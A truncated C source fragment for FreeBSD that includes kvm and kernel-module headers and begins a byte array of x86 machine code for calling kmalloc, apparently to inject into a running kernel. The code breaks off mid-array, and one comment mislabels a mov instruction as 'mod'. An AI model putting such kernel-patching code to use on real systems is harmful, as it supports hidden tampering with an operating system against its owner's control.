#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>

unsigned char kmalloc[] =
    "\x55"                  /* push %ebp */
    "\xb9\x01\x00\x00\x00"  /* mod $0x1, %ecx */
    "\x89\xe5"              /* mov %esp, %ebp */
    "\x53"                  /* push %ebx */
    "\xba\x00\x00\x00\x00"  /* mov $0x0, %edx */
    "\x83\xec\x10"          /* sub $0x10, %esp */
    "\x89\x4c\x24\x08"      /* mov %ecx, 0x8(%esp) */
    "\x8b\x5d\x0c"          /* mov 0xc(%ebp), %ebx */
    "\x89\x54\x24\x04"      /* mov %edx, 0x4(%esp) */
    "\x8b\x03"              /* mov (%ebx), %eax */
    "\x89\x04\x24"          /* mov %eax, (%esp) */
    "\xe8\xfc\xff\xff\xff"  /* call 4e2 <kmalloc+0x22> */
    "\x89\x45\xf8"          /* mov %eax, 0xfffffff8(%ebp) <err, you mean -8?> */
